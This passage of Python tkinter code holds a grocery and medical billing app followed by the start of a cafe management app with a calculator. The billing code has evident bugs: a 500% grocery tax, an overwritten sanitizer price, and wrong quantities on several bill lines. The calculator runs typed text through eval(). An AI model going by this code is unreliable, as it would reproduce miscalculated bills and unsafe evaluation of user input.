        sanitizer_txt.grid(row=0, column=1, padx=10, pady=10)

        mask_lbl = Label(F2, text="Mask", font=('times new roman', 16, 'bold'), bg="#badc57", fg="black")
        mask_lbl.grid(row=1, column=0, padx=10, pady=10, sticky='W')
        mask_txt = Entry(F2, width=10, textvariable=self.mask, font=('times new roman', 16, 'bold'), bd=5,
                         relief=GROOVE)
        mask_txt.grid(row=1, column=1, padx=10, pady=10)

        hand_gloves_lbl = Label(F2, text="Hand Gloves", font=('times new roman', 16, 'bold'), bg="#badc57", fg="black")
        hand_gloves_lbl.grid(row=2, column=0, padx=10, pady=10, sticky='W')
        hand_gloves_txt = Entry(F2, width=10, textvariable=self.hand_gloves, font=('times new roman', 16, 'bold'), bd=5,
                                relief=GROOVE)
        hand_gloves_txt.grid(row=2, column=1, padx=10, pady=10)

        syrup_lbl = Label(F2, text="Syrup", font=('times new roman', 16, 'bold'), bg="#badc57", fg="black")
        syrup_lbl.grid(row=3, column=0, padx=10, pady=10, sticky='W')
        syrup_txt = Entry(F2, width=10, textvariable=self.syrup, font=('times new roman', 16, 'bold'), bd=5,
                          relief=GROOVE)
        syrup_txt.grid(row=3, column=1, padx=10, pady=10)

        cream_lbl = Label(F2, text="Cream", font=('times new roman', 16, 'bold'), bg="#badc57", fg="black")
        cream_lbl.grid(row=4, column=0, padx=10, pady=10, sticky='W')
        cream_txt = Entry(F2, width=10, textvariable=self.cream, font=('times new roman', 16, 'bold'), bd=5,
                          relief=GROOVE)
        cream_txt.grid(row=4, column=1, padx=10, pady=10)

        thermal_gun_lbl = Label(F2, text="Thermal Gun", font=('times new roman', 16, 'bold'), bg="#badc57", fg="black")
        thermal_gun_lbl.grid(row=5, column=0, padx=10, pady=10, sticky='W')
        thermal_gun_txt = Entry(F2, width=10, textvariable=self.thermal_gun, font=('times new roman', 16, 'bold'), bd=5,
                                relief=GROOVE)
        thermal_gun_txt.grid(row=5, column=1, padx=10, pady=10)

        # ==========GroceryItems=========================
        F3 = LabelFrame(self.root, text="Grocery Items", font=('times new roman', 15, 'bold'), bd=10, fg="Black",
                        bg="#badc57")
        F3.place(x=340, y=180, width=325, height=380)

        rice_lbl = Label(F3, text="Rice", font=('times new roman', 16, 'bold'), bg="#badc57", fg="black")
        rice_lbl.grid(row=0, column=0, padx=10, pady=10, sticky='W')
        rice_txt = Entry(F3, width=10, textvariable=self.rice, font=('times new roman', 16, 'bold'), bd=5,
                         relief=GROOVE)
        rice_txt.grid(row=0, column=1, padx=10, pady=10)

        food_oil_lbl = Label(F3, text="Food Oil", font=('times new roman', 16, 'bold'), bg="#badc57", fg="black")
        food_oil_lbl.grid(row=1, column=0, padx=10, pady=10, sticky='W')
        food_oil_txt = Entry(F3, width=10, textvariable=self.food_oil, font=('times new roman', 16, 'bold'), bd=5,
                             relief=GROOVE)
        food_oil_txt.grid(row=1, column=1, padx=10, pady=10)

        wheat_lbl = Label(F3, text="Wheat", font=('times new roman', 16, 'bold'), bg="#badc57", fg="black")
        wheat_lbl.grid(row=2, column=0, padx=10, pady=10, sticky='W')
        wheat_txt = Entry(F3, width=10, textvariable=self.wheat, font=('times new roman', 16, 'bold'), bd=5,
                          relief=GROOVE)
        wheat_txt.grid(row=2, column=1, padx=10, pady=10)

        spices_lbl = Label(F3, text="Spices", font=('times new roman', 16, 'bold'), bg="#badc57", fg="black")
        spices_lbl.grid(row=3, column=0, padx=10, pady=10, sticky='W')
        spices_txt = Entry(F3, width=10, textvariable=self.spices, font=('times new roman', 16, 'bold'), bd=5,
                           relief=GROOVE)
        spices_txt.grid(row=3, column=1, padx=10, pady=10)

        flour_lbl = Label(F3, text="Flour", font=('times new roman', 16, 'bold'), bg="#badc57", fg="black")
        flour_lbl.grid(row=4, column=0, padx=10, pady=10, sticky='W')
        flour_txt = Entry(F3, width=10, textvariable=self.flour, font=('times new roman', 16, 'bold'), bd=5,
                          relief=GROOVE)
        flour_txt.grid(row=4, column=1, padx=10, pady=10)

        maggi_lbl = Label(F3, text="Maggi", font=('times new roman', 16, 'bold'), bg="#badc57", fg="black")
        maggi_lbl.grid(row=5, column=0, padx=10, pady=10, sticky='W')
        maggi_txt = Entry(F3, width=10, textvariable=self.maggi, font=('times new roman', 16, 'bold'), bd=5,
                          relief=GROOVE)
        maggi_txt.grid(row=5, column=1, padx=10, pady=10)

        # ===========ColdDrinks================================
        F4 = LabelFrame(self.root, text="Cold Drinks", font=('times new roman', 15, 'bold'), bd=10, fg="Black",
                        bg="#badc57")
        F4.place(x=670, y=180, width=325, height=380)

        sprite_lbl = Label(F4, text="Sprite", font=('times new roman', 16, 'bold'), bg="#badc57", fg="black")
        sprite_lbl.grid(row=0, column=0, padx=10, pady=10, sticky='W')
        sprite_txt = Entry(F4, width=10, textvariable=self.sprite, font=('times new roman', 16, 'bold'), bd=5,
                           relief=GROOVE)
        sprite_txt.grid(row=0, column=1, padx=10, pady=10)

        mineral_lbl = Label(F4, text="Mineral Water", font=('times new roman', 16, 'bold'), bg="#badc57", fg="black")
        mineral_lbl.grid(row=1, column=0, padx=10, pady=10, sticky='W')
        mineral_txt = Entry(F4, width=10, textvariable=self.mineral, font=('times new roman', 16, 'bold'), bd=5,
                            relief=GROOVE)
        mineral_txt.grid(row=1, column=1, padx=10, pady=10)

        juice_lbl = Label(F4, text="Juice", font=('times new roman', 16, 'bold'), bg="#badc57", fg="black")
        juice_lbl.grid(row=2, column=0, padx=10, pady=10, sticky='W')
        juice_txt = Entry(F4, width=10, textvariable=self.juice, font=('times new roman', 16, 'bold'), bd=5,
                          relief=GROOVE)
        juice_txt.grid(row=2, column=1, padx=10, pady=10)

        coke_lbl = Label(F4, text="Coke", font=('times new roman', 16, 'bold'), bg="#badc57", fg="black")
        coke_lbl.grid(row=3, column=0, padx=10, pady=10, sticky='W')
        coke_txt = Entry(F4, width=10, textvariable=self.coke, font=('times new roman', 16, 'bold'), bd=5,
                         relief=GROOVE)
        coke_txt.grid(row=3, column=1, padx=10, pady=10)

        lassi_lbl = Label(F4, text="Lassi", font=('times new roman', 16, 'bold'), bg="#badc57", fg="black")
        lassi_lbl.grid(row=4, column=0, padx=10, pady=10, sticky='W')
        lassi_txt = Entry(F4, width=10, textvariable=self.lassi, font=('times new roman', 16, 'bold'), bd=5,
                          relief=GROOVE)
        lassi_txt.grid(row=4, column=1, padx=10, pady=10)

        mountain_duo_lbl = Label(F4, text="Mountain Duo", font=('times new roman', 16, 'bold'), bg="#badc57",
                                 fg="black")
        mountain_duo_lbl.grid(row=5, column=0, padx=10, pady=10, sticky='W')
        mountain_duo_txt = Entry(F4, width=10, textvariable=self.mountain_duo, font=('times new roman', 16, 'bold'),
                                 bd=5, relief=GROOVE)
        mountain_duo_txt.grid(row=5, column=1, padx=10, pady=10)

        # =================BillArea======================
        F5 = Frame(self.root, bd=10, relief=GROOVE)
        F5.place(x=1010, y=180, width=350, height=380)

        bill_title = Label(F5, text="Bill Area", font='arial 15 bold', bd=7, relief=GROOVE)
        bill_title.pack(fill=X)
        scroll_y = Scrollbar(F5, orient=VERTICAL)
        self.txtarea = Text(F5, yscrollcommand=scroll_y.set)
        scroll_y.pack(side=RIGHT, fill=Y)
        scroll_y.config(command=self.txtarea.yview)
        self.txtarea.pack(fill=BOTH, expand=1)

        # =======================ButtonFrame=============
        F6 = LabelFrame(self.root, text="Bill Area", font=('times new roman', 14, 'bold'), bd=10, fg="Black",
                        bg="#badc57")
        F6.place(x=0, y=560, relwidth=1, height=140)

        m1_lbl = Label(F6, text="Total Medical Price", font=('times new roman', 14, 'bold'), bg="#badc57", fg="black")
        m1_lbl.grid(row=0, column=0, padx=20, pady=1, sticky='W')
        m1_txt = Entry(F6, width=18, textvariable=self.medical_price, font='arial 10 bold', bd=7, relief=GROOVE)
        m1_txt.grid(row=0, column=1, padx=18, pady=1)

        m2_lbl = Label(F6, text="Total Grocery Price", font=('times new roman', 14, 'bold'), bg="#badc57", fg="black")
        m2_lbl.grid(row=1, column=0, padx=20, pady=1, sticky='W')
        m2_txt = Entry(F6, width=18, textvariable=self.grocery_price, font='arial 10 bold', bd=7, relief=GROOVE)
        m2_txt.grid(row=1, column=1, padx=18, pady=1)

        m3_lbl = Label(F6, text="Total Cold Drinks Price", font=('times new roman', 14, 'bold'), bg="#badc57",
                       fg="black")
        m3_lbl.grid(row=2, column=0, padx=20, pady=1, sticky='W')
        m3_txt = Entry(F6, width=18, textvariable=self.cold_drinks_price, font='arial 10 bold', bd=7, relief=GROOVE)
        m3_txt.grid(row=2, column=1, padx=18, pady=1)

        m4_lbl = Label(F6, text="Medical Tax", font=('times new roman', 14, 'bold'), bg="#badc57", fg="black")
        m4_lbl.grid(row=0, column=2, padx=20, pady=1, sticky='W')
        m4_txt = Entry(F6, width=18, textvariable=self.medical_tax, font='arial 10 bold', bd=7, relief=GROOVE)
        m4_txt.grid(row=0, column=3, padx=18, pady=1)

        m5_lbl = Label(F6, text="Grocery Tax", font=('times new roman', 14, 'bold'), bg="#badc57", fg="black")
        m5_lbl.grid(row=1, column=2, padx=20, pady=1, sticky='W')
        m5_txt = Entry(F6, width=18, textvariable=self.grocery_tax, font='arial 10 bold', bd=7, relief=GROOVE)
        m5_txt.grid(row=1, column=3, padx=18, pady=1)

        m6_lbl = Label(F6, text="Cold Drinks Tax", font=('times new roman', 14, 'bold'), bg="#badc57", fg="black")
        m6_lbl.grid(row=2, column=2, padx=20, pady=1, sticky='W')
        m6_txt = Entry(F6, width=18, textvariable=self.cold_drinks_tax, font='arial 10 bold', bd=7, relief=GROOVE)
        m6_txt.grid(row=2, column=3, padx=18, pady=1)

        # =======Buttons-======================================
        btn_f = Frame(F6, bd=7, relief=GROOVE)
        btn_f.place(x=760, width=580, height=105)

        total_btn = Button(btn_f, command=self.total, text="Total", bg="#535C68", bd=2, fg="white", pady=15, width=12,
                           font='arial 13 bold')
        total_btn.grid(row=0, column=0, padx=5, pady=5)

        generateBill_btn = Button(btn_f, command=self.bill_area, text="Generate Bill", bd=2, bg="#535C68", fg="white",
                                  pady=12, width=12, font='arial 13 bold')
        generateBill_btn.grid(row=0, column=1, padx=5, pady=5)

        clear_btn = Button(btn_f, command=self.clear_data, text="Clear", bg="#535C68", bd=2, fg="white", pady=15,
                           width=12, font='arial 13 bold')
        clear_btn.grid(row=0, column=2, padx=5, pady=5)

        exit_btn = Button(btn_f, command=self.exit_app, text="Exit", bd=2, bg="#535C68", fg="white", pady=15, width=12,
                          font='arial 13 bold')
        exit_btn.grid(row=0, column=3, padx=5, pady=5)
        self.welcome_bill()

    def total(self):
        self.m_h_g_p = self.hand_gloves.get() * 12
        self.m_s_p = self.sanitizer.get() * 2
        self.m_m_p = self.mask.get() * 5
        self.m_s_p = self.syrup.get() * 30
        self.m_c_p = self.cream.get() * 5
        self.m_t_g_p = self.thermal_gun.get() * 15
        self.total_medical_price = float(
            self.m_m_p + self.m_h_g_p + self.m_s_p + self.m_c_p + self.m_t_g_p + self.m_s_p)

        self.medical_price.set("Rs. " + str(self.total_medical_price))
        self.c_tax = round((self.total_medical_price * 0.05), 2)
        self.medical_tax.set("Rs. " + str(self.c_tax))

        self.g_r_p = self.rice.get() * 10
        self.g_f_o_p = self.food_oil.get() * 10
        self.g_w_p = self.wheat.get() * 10
        self.g_s_p = self.spices.get() * 6
        self.g_f_p = self.flour.get() * 8
        self.g_m_p = self.maggi.get() * 5
        self.total_grocery_price = float(self.g_r_p + self.g_f_o_p + self.g_w_p + self.g_s_p + self.g_f_p + self.g_m_p)

        self.grocery_price.set("Rs. " + str(self.total_grocery_price))
        self.g_tax = round((self.total_grocery_price * 5), 2)
        self.grocery_tax.set("Rs. " + str(self.g_tax))

        self.c_d_s_p = self.sprite.get() * 10
        self.c_d_w_p = self.mineral.get() * 10
        self.c_d_j_p = self.juice.get() * 10
        self.c_d_c_p = self.coke.get() * 10
        self.c_d_l_p = self.lassi.get() * 10
        self.c_m_d = self.mountain_duo.get() * 10
        self.total_cold_drinks_price = float(
            self.c_d_s_p + self.c_d_w_p + self.c_d_j_p + self.c_d_c_p + self.c_d_l_p + self.c_m_d)

        self.cold_drinks_price.set("Rs. " + str(self.total_cold_drinks_price))
        self.c_d_tax = round((self.total_cold_drinks_price * 0.1), 2)
        self.cold_drinks_tax.set("Rs. " + str(self.c_d_tax))

        self.total_bill = float(
            self.total_medical_price + self.total_grocery_price + self.total_cold_drinks_price + self.c_tax + self.g_tax + self.c_d_tax)

    def welcome_bill(self):
        self.txtarea.delete('1.0', END)
        self.txtarea.insert(END, "\tWelcome Grocery Retail")
        self.txtarea.insert(END, f"\nBill Number:{self.bill_no.get()}")
        self.txtarea.insert(END, f"\nCustomer Name:{self.c_name.get()}")
        self.txtarea.insert(END, f"\nPhone Number{self.c_phone.get()}")
        self.txtarea.insert(END, f"\n================================")
        self.txtarea.insert(END, f"\nProducts\t\tQTY\t\tPrice")

    def bill_area(self):
        if self.c_name.get() == " " or self.c_phone.get() == " ":
            messagebox.showerror("Error", "Customer Details Are Must")
        elif self.medical_price.get() == "Rs. 0.0" and self.grocery_price.get() == "Rs. 0.0" and self.cold_drinks_price.get() == "Rs. 0.0":
            messagebox.showerror("Error", "No Product Purchased")
        else:
            self.welcome_bill()
        # ============medical===========================
        if self.sanitizer.get() != 0:
            self.txtarea.insert(END, f"\n Sanitizer\t\t{self.sanitizer.get()}\t\t{self.m_s_p}")
        if self.mask.get() != 0:
            self.txtarea.insert(END, f"\n Mask\t\t{self.mask.get()}\t\t{self.m_m_p}")
        if self.hand_gloves.get() != 0:
            self.txtarea.insert(END, f"\n Hand Gloves\t\t{self.hand_gloves.get()}\t\t{self.m_h_g_p}")
        if self.syrup.get() != 0:
            self.txtarea.insert(END, f"\n Syrup\t\t{self.syrup.get()}\t\t{self.m_s_p}")
        if self.cream.get() != 0:
            self.txtarea.insert(END, f"\n Cream\t\t{self.cream.get()}\t\t{self.m_c_p}")
        if self.thermal_gun.get() != 0:
            self.txtarea.insert(END, f"\n Thermal Gun\t\t{self.sanitizer.get()}\t\t{self.m_t_g_p}")
        # ==============Grocery============================
        if self.rice.get() != 0:
            self.txtarea.insert(END, f"\n Rice\t\t{self.rice.get()}\t\t{self.g_r_p}")
        if self.food_oil.get() != 0:
            self.txtarea.insert(END, f"\n Food Oil\t\t{self.food_oil.get()}\t\t{self.g_f_o_p}")
        if self.wheat.get() != 0:
            self.txtarea.insert(END, f"\n Wheat\t\t{self.wheat.get()}\t\t{self.g_w_p}")
        if self.spices.get() != 0:
            self.txtarea.insert(END, f"\n Spices\t\t{self.spices.get()}\t\t{self.g_s_p}")
        if self.flour.get() != 0:
            self.txtarea.insert(END, f"\n Flour\t\t{self.flour.get()}\t\t{self.g_f_p}")
        if self.maggi.get() != 0:
            self.txtarea.insert(END, f"\n Maggi\t\t{self.maggi.get()}\t\t{self.g_m_p}")
        # ================ColdDrinks==========================
        if self.sprite.get() != 0:
            self.txtarea.insert(END, f"\n Sprite\t\t{self.sprite.get()}\t\t{self.c_d_s_p}")
        if self.mineral.get() != 0:
            self.txtarea.insert(END, f"\n Mineral\t\t{self.mineral.get()}\t\t{self.c_d_w_p}")
        if self.juice.get() != 0:
            self.txtarea.insert(END, f"\n Juice\t\t{self.juice.get()}\t\t{self.c_d_j_p}")
        if self.coke.get() != 0:
            self.txtarea.insert(END, f"\n Coke\t\t{self.coke.get()}\t\t{self.c_d_c_p}")
        if self.lassi.get() != 0:
            self.txtarea.insert(END, f"\n Lassi\t\t{self.cream.get()}\t\t{self.c_d_l_p}")
        if self.mountain_duo.get() != 0:
            self.txtarea.insert(END, f"\n Mountain Duo\t\t{self.sanitizer.get()}\t\t{self.c_m_d}")
            self.txtarea.insert(END, f"\n--------------------------------")
        # ===============taxes==============================
        if self.medical_tax.get() != '0.0':
            self.txtarea.insert(END, f"\n Medical Tax\t\t\t{self.medical_tax.get()}")
        if self.grocery_tax.get() != '0.0':
            self.txtarea.insert(END, f"\n Grocery Tax\t\t\t{self.grocery_tax.get()}")
        if self.cold_drinks_tax.get() != '0.0':
            self.txtarea.insert(END, f"\n Cold Drinks Tax\t\t\t{self.cold_drinks_tax.get()}")

        self.txtarea.insert(END, f"\n Total Bil:\t\t\t Rs.{self.total_bill}")
        self.txtarea.insert(END, f"\n--------------------------------")
        self.save_bill()

    def save_bill(self):
        op = messagebox.askyesno("Save Bill", "Do you want to save the bill?")
        if op > 0:
            self.bill_data = self.txtarea.get('1.0', END)
            f1 = open("bills/" + str(self.bill_no.get()) + ".txt", "w")
            f1.write(self.bill_data)
            f1.close()
            messagebox.showinfo("Saved", f"Bill no:{self.bill_no.get()} Saved Successfully")
        else:
            return

    def find_bill(self):
        present = "no"
        for i in os.listdir("bills/"):
            if i.split('.')[0] == self.search_bill.get():
                f1 = open(f"bills/{i}", "r")
                self.txtarea.delete("1.0", END)
                for d in f1:
                    self.txtarea.insert(END, d)
                    f1.close()
                present = "yes"
        if present == "no":
            messagebox.showerror("Error", "Invalid Bill No")

    def clear_data(self):
        op = messagebox.askyesno("Clear", "Do you really want to Clear?")
        if op > 0:
            self.sanitizer.set(0)
            self.mask.set(0)
            self.hand_gloves.set(0)
            self.syrup.set(0)
            self.cream.set(0)
            self.thermal_gun.set(0)
            # ============grocery==============================
            self.rice.set(0)
            self.food_oil.set(0)
            self.wheat.set(0)
            self.spices.set(0)
            self.flour.set(0)
            self.maggi.set(0)
            # =============coldDrinks=============================
            self.sprite.set(0)
            self.mineral.set(0)
            self.juice.set(0)
            self.coke.set(0)
            self.lassi.set(0)
            self.mountain_duo.set(0)
            # ====================taxes================================
            self.medical_price.set("")
            self.grocery_price.set("")
            self.cold_drinks_price.set("")

            self.medical_tax.set("")
            self.grocery_tax.set("")
            self.cold_drinks_tax.set("")

            self.c_name.set("")
            self.c_phone.set("")

            self.bill_no.set("")
            x = random.randint(1000, 9999)
            self.bill_no.set(str(x))

            self.search_bill.set("")
            self.welcome_bill()

    def exit_app(self):
        op = messagebox.askyesno("Exit", "Do you really want to exit?")
        if op > 0:
            self.root.destroy()


root = Tk()
obj = Bill_App(root)
root.mainloop()

from tkinter import *
import tkinter as tk
from datetime import datetime
from PIL import ImageTk, Image
from tkinter import messagebox


class cafe_management():

    # ============== Total Bill Code =================

    def Total_Bill(self):
        self.tea_price = 10
        self.coffee_price = 20
        self.sandwitch_price = 50
        self.cake_price = 100
        self.burger_price = 50
        self.pizza_price = 150
        self.fries_price = 80
        self.pepsi_price = 80

        if self.tea_item.get() != "":
            self.tea_cost = self.tea_price * int(self.tea_item.get())
        else:
            self.tea_cost = 0
        if self.coffee_item.get() != "":
            self.coffee_cost = self.coffee_price * int(self.coffee_item.get())
        else:
            self.coffee_cost = 0
        if self.sandwitch_item.get() != "":
            self.sandwitch_cost = self.sandwitch_price * int(self.sandwitch_item.get())
        else:
            self.sandwitch_cost = 0
        if self.cake_item.get() != "":
            self.cake_cost = self.cake_price * int(self.cake_item.get())
        else:
            self.cake_cost = 0
        if self.burger_item.get() != "":
            self.burger_cost = self.burger_price * int(self.burger_item.get())
        else:
            self.burger_cost = 0
        if self.pizza_item.get() != "":
            self.pizza_cost = self.pizza_price * int(self.pizza_item.get())
        else:
            self.pizza_cost = 0
        if self.fries_item.get() != "":
            self.fries_cost = self.fries_price * int(self.fries_item.get())
        else:
            self.fries_cost = 0
        if self.pepsi_item.get() != "":
            self.pepsi_cost = self.pepsi_price * int(self.pepsi_item.get())
        else:
            self.pepsi_cost = 0

        self.Total_Bill = self.pepsi_cost + self.fries_cost + self.pizza_cost + self.burger_cost + self.cake_cost + self.sandwitch_cost + self.coffee_cost + self.tea_cost

        if self.items_cost != "":
            self.items_cost.delete(0, END)
            self.items_cost.insert(END, self.Total_Bill)
        else:
            self.items_cost.insert(END, self.Total_Bill)
        if self.service_cost != "":
            self.service_cost.delete(0, END)
            self.service_cost.insert(END, 10.0)
        else:
            self.service_cost.insert(END, 10.0)
        if self.sub_cost != "":
            self.sub_cost.delete(0, END)
            self.sub_cost.insert(END, int(self.items_cost.get()) + float(self.service_cost.get()))
        else:
            self.sub_cost.insert(END, int(self.items_cost.get()) + float(self.service_cost.get()))
        if self.paid_tax != "":
            self.paid_tax.delete(0, END)
            self.paid_tax.insert(END, float(self.sub_cost.get()) * 8 / 100)
        else:
            self.paid_tax.insert(END, float(self.sub_cost.get()) * 8 / 100)

        if self.total_bill != "":
            self.total_bill.delete(0, END)
            self.total_bill.insert(END, float(self.sub_cost.get()) + float(self.paid_tax.get()))
        else:
            self.total_bill.insert(END, float(self.sub_cost.get()) + float(self.paid_tax.get()))

    # ===== Calculator code ================

    def nine(self):
        if 'error' in self.result.get() or '=' in self.result.get():
            self.result.delete(0, "end")
            self.result.insert("end", "9")
        else:
            self.result.insert("end", "9")

    def eight(self):
        if 'error' in self.result.get() or '=' in self.result.get():
            self.result.delete(0, "end")
            self.result.insert("end", "8")
        else:
            self.result.insert("end", "8")

    def seven(self):
        if 'error' in self.result.get() or '=' in self.result.get():
            self.result.delete(0, "end")
            self.result.insert("end", "7")
        else:
            self.result.insert("end", "7")

    def six(self):
        if 'error' in self.result.get() or '=' in self.result.get():
            self.result.delete(0, "end")
            self.result.insert("end", "6")
        else:
            self.result.insert("end", "6")

    def five(self):
        if 'error' in self.result.get() or '=' in self.result.get():
            self.result.delete(0, "end")
            self.result.insert("end", "5")
        else:
            self.result.insert("end", "5")

    def four(self):
        if 'error' in self.result.get() or '=' in self.result.get():
            self.result.delete(0, "end")
            self.result.insert("end", "4")
        else:
            self.result.insert("end", "4")

    def three(self):
        if 'error' in self.result.get() or '=' in self.result.get():
            self.result.delete(0, "end")
            self.result.insert("end", "3")
        else:
            self.result.insert("end", "3")

    def two(self):
        if 'error' in self.result.get() or '=' in self.result.get():
            self.result.delete(0, "end")
            self.result.insert("end", "2")
        else:
            self.result.insert("end", "2")

    def one(self):
        if 'error' in self.result.get() or '=' in self.result.get():
            self.result.delete(0, "end")
            self.result.insert("end", "1")
        else:
            self.result.insert("end", "1")

    def zero(self):
        if 'error' in self.result.get() or '=' in self.result.get():
            self.result.delete(0, "end")
            self.result.insert("end", "0")
        else:
            self.result.insert("end", "0")

    def plus(self):
        if 'error' in self.result.get() or '=' in self.result.get():
            self.result.delete(0, "end")
            self.result.insert("end", "+")
        else:
            self.result.insert("end", "+")

    def minus(self):
        if 'error' in self.result.get() or '=' in self.result.get():
            self.result.delete(0, "end")
            self.result.insert("end", "-")
        else:
            self.result.insert("end", "-")

    def mul(self):
        if 'error' in self.result.get() or '=' in self.result.get():
            self.result.delete(0, "end")
            self.result.insert("end", "*")
        else:
            self.result.insert("end", "*")

    def divide(self):
        if 'error' in self.result.get() or '=' in self.result.get():
            self.result.delete(0, "end")
            self.result.insert("end", "/")
        else:
            self.result.insert("end", "/")

    def equal(self):

        if self.result.get() == "":
            self.result.insert("end", "error")
        elif self.result.get()[0] == "0" or self.result.get()[0] == "+" or self.result.get()[0] == "*" or \
                self.result.get()[0] == "/":
            self.result.delete(0, "end")
            self.result.insert("end", "error")
        elif 'error' in self.result.get() or '=' in self.result.get():
            self.result.delete(0, "end")


        else:
            self.res = self.result.get()
            self.res = eval(self.res)
            self.result.insert("end", " = ")
            self.result.insert("end", self.res)

    # =================== Clear Fields ===============
    def clear(self):
        self.result.delete(0, "end")

    def Clear(self):
        self.tea_item.delete(0, "end")
        self.coffee_item.delete(0, "end")
        self.sandwitch_item.delete(0, "end")
        self.burger_item.delete(0, "end")
        self.cake_item.delete(0, "end")
        self.fries_item.delete(0, "end")
        self.pizza_item.delete(0, "end")
        self.pepsi_item.delete(0, "end")
        self.items_cost.delete(0, "end")
        self.service_cost.delete(0, "end")
        self.sub_cost.delete(0, "end")
        self.paid_tax.delete(0, "end")
        self.total_bill.delete(0, "end")

    # ==== Exit button code =================
    def Quit(self):
        self.message = messagebox.askquestion('Exit', "Do you want to exit the application")
        if self.message == "yes":
            self.root.destroy()
        else:
            "return"

        # ========== end ========================

    def __init__(self):
        self.root = tk.Tk()
        self.root.geometry('500x300')
        self.root.title("Cafe Management System")
        self.root.maxsize(500, 300)
        self.root.minsize(500, 300)
        self.root['bg'] = "white"

        self.heading = Label(self.root, text="Cafe Management System", font=('verdana', 20, 'bold'), fg="#248aa2",
                             bg="white")
        self.heading.place(x=60, y=5)

        self.style1 = Label(self.root, bg="#248aa2", height=1, width=17)
        self.style1.place(x=0, y=50)
        self.style2 = Label(self.root, bg="#248aa2", height=1, width=30)
        self.style2.place(x=380, y=50)
        self.date = Label(self.root, text=datetime.now(), font=('verdana', 10, 'bold'), bg="white")
        self.date.place(x=140, y=50)

        self.cafe_icon = ImageTk.PhotoImage(Image.open('cafe.png'))
        self.logo = Label(self.root, image=self.cafe_icon, bg="white")
        self.logo.place(x=230, y=70)

        # ================== Items ===================
        self.frame1 = LabelFrame(self.root, text="Cafe Items", width=150, height=200, font=('verdana', 10, 'bold'),
                                 borderwidth=3, relief=RIDGE, highlightthickness=4, bg="white", highlightcolor="white",
                                 highlightbackground="white", fg="#248aa2")
        self.frame1.place(x=30, y=90)

        self.tea = Label(self.frame1, text="Tea", font=('verdana', 10, 'bold'), bg="white")
        self.tea.place(x=3, y=1)
        self.tea_item = Entry(self.frame1, width=7, borderwidth=4, relief=SUNKEN, bg="#248aa2")
        self.tea_item.place(y=1, x=85)

        self.coffee = Label(self.frame1, text="Coffee", font=('verdana', 10, 'bold'), bg="white")
        self.coffee.place(x=3, y=20)
        self.coffee_item = Entry(self.frame1, width=7, borderwidth=4, relief=SUNKEN, bg="#248aa2")
        self.coffee_item.place(y=20, x=85)

        self.sandwitch = Label(self.frame1, text="Sandwitch", font=('verdana', 10, 'bold'), bg="white")
        self.sandwitch.place(x=3, y=40)
        self.sandwitch_item = Entry(self.frame1, width=7, borderwidth=4, relief=SUNKEN, bg="#248aa2")
        self.sandwitch_item.place(y=40, x=85)

        self.cake = Label(self.frame1, text="Cake", font=('verdana', 10, 'bold'), bg="white")
        self.cake.place(x=3, y=60)
        self.cake_item = Entry(self.frame1, width=7, borderwidth=4, relief=SUNKEN, bg="#248aa2")
        self.cake_item.place(y=60, x=85)

        self.burger = Label(self.frame1, text="Burger", font=('verdana', 10, 'bold'), bg="white")
        self.burger.place(x=3, y=80)
        self.burger_item = Entry(self.frame1, width=7, borderwidth=4, relief=SUNKEN, bg="#248aa2")
        self.burger_item.place(y=80, x=85)

        self.pizza = Label(self.frame1, text="Pizza", font=('verdana', 10, 'bold'), bg="white")
        self.pizza.place(x=3, y=100)
        self.pizza_item = Entry(self.frame1, width=7, borderwidth=4, relief=SUNKEN, bg="#248aa2")
        self.pizza_item.place(y=100, x=85)

        self.fries = Label(self.frame1, text="Fries", font=('verdana', 10, 'bold'), bg="white")
        self.fries.place(x=3, y=120)
        self.fries_item = Entry(self.frame1, width=7, borderwidth=4, relief=SUNKEN, bg="#248aa2")
        self.fries_item.place(y=120, x=85)

        self.pepsi = Label(self.frame1, text="Pepsi", font=('verdana', 10, 'bold'), bg="white")
        self.pepsi.place(x=3, y=140)
        self.pepsi_item = Entry(self.frame1, width=7, borderwidth=4, relief=SUNKEN, bg="#248aa2")
        self.pepsi_item.place(y=140, x=85)

        # ============ Items Bill =================

        self.frame2 = LabelFrame(self.root, text="Cafe Items Bills", width=180, height=160,
                                 font=('verdana', 10, 'bold'), borderwidth=3, relief=RIDGE, highlightthickness=4,
                                 bg="white", highlightcolor="white", highlightbackground="white", fg="#248aa2")
        self.frame2.place(x=180, y=120)

        self.item_cost_lb = Label(self.frame2, text="Items Cost", font=('verdana', 10, 'bold'), bg="white")
        self.item_cost_lb.place(x=3, y=1)
        self.items_cost = Entry(self.frame2, width=9, borderwidth=4, relief=SUNKEN, bg="#248aa2")
        self.items_cost.place(y=1, x=100)

        self.service_cost_lb = Label(self.frame2, text="Service Cost", font=('verdana', 10, 'bold'), bg="white")
        self.service_cost_lb.place(x=3, y=20)
        self.service_cost = Entry(self.frame2, width=9, borderwidth=4, relief=SUNKEN, bg="#248aa2")
        self.service_cost.place(y=20, x=100)

        self.sub_cost_lb = Label(self.frame2, text="Sub Cost", font=('verdana', 10, 'bold'), bg="white")
        self.sub_cost_lb.place(x=3, y=40)
        self.sub_cost = Entry(self.frame2, width=9, borderwidth=4, relief=SUNKEN, bg="#248aa2")
        self.sub_cost.place(y=40, x=100)

        self.paid_tax_lb = Label(self.frame2, text="Paid Tax", font=('verdana', 10, 'bold'), bg="white")
        self.paid_tax_lb.place(x=3, y=80)
        self.paid_tax = Entry(self.frame2, width=9, borderwidth=4, relief=SUNKEN, bg="#248aa2")
        self.paid_tax.place(y=80, x=100)

        self.total_bill_lb = Label(self.frame2, text="Total Bill", font=('verdana', 10, 'bold'), bg="white")
        self.total_bill_lb.place(x=3, y=100)
        self.total_bill = Entry(self.frame2, width=9, borderwidth=4, relief=SUNKEN, bg="#248aa2")
        self.total_bill.place(y=100, x=100)

        # ================== Calculator ============
        self.frame3 = LabelFrame(self.root, text="Calculator", font=('verdana', 10, 'bold'), fg="#248aa2", bg="white",
                                 highlightbackground="white", width=135, height=150, borderwidth=3, relief=RIDGE)
        self.frame3.place(x=360, y=90)

        self.result = Entry(self.frame3, width=19, relief=SUNKEN, borderwidth=3)
        self.result.place(x=2, y=0)

        self.nine = Button(self.frame3, text="9", padx=6, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'),
                           bg='#248aa2', fg="white", command=self.nine)
        self.nine.place(x=0, y=24)
        self.eight = Button(self.frame3, text="8", padx=6, relief=RAISED, borderwidth=2, font=('verdana', 10, 'bold'),
                            bg='#248aa2', fg="white", command=self.eight)
        self.eight.place(x=32, y=24)
